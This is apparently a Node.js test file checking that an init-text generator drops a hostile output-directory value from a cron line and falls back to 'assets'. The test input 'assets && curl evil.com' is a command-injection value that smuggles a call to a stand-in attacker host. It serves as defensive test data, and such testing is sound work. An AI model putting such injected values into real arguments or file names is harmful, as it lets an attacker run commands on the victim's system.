import test from 'node:test';
import assert from 'node:assert/strict';
import { initText } from '../src/snippet.mjs';

test('init cron example falls back to assets for hostile out-dir', () => {
  const text = initText('assets && curl evil.com');
  const cronLine = text.split('\n').find((line) => line.startsWith('0 8 * * *'));

  assert.match(text, /srcset="assets && curl evil.com\/ai-usage-dark\.svg"/);
  assert.match(cronLine, /--out-dir assets/);
  assert.doesNotMatch(cronLine, /curl evil\.com/);
});
